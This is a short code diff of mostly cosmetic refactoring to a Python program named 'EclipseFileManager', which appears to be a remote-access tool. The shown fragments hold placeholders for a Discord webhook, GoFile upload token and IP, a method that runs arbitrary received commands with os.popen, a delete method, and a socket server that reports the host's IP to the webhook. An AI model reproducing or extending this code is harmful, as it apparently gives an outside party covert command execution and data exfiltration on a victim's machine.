@@ -17,7 +17,7 @@ from discord_webhook import DiscordWebhook
 __webhook__ = ''  # Put your webhook here
 __gofileToken__ = ''  # Put your GoFile token here
 __ip__ = ''  # Put your machines IP here
-__PORT__ = '' # leave this blank if u don't know what it means
+__PORT__ = ''  # leave this blank if u don't know what it means
 
 
 class Util(object):
@@ -154,7 +154,8 @@ class Modules(Util):
         except:
             this.send('something went wrong!')
 
-    def remoteExecute(this, path):
+    @staticmethod
+    def remoteExecute(path):
         os.popen(path)
 
     def delete(this, path):
@@ -196,7 +197,7 @@ class Modules(Util):
         os.remove(this.output_file)
 
 
-class EclipseFileManager():
+class EclipseFileManager:
     def __init__(this):
         this.modules = Modules()
         this.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -259,6 +260,7 @@ class EclipseFileManager():
         this.modules.send(f'My ip is {socket.gethostbyname(socket.gethostname())}!')
         Thread(target=this.checkip).start()
         this.listen()
+
 
 if __name__ == "__main__":
     EclipseFileManager().Main()
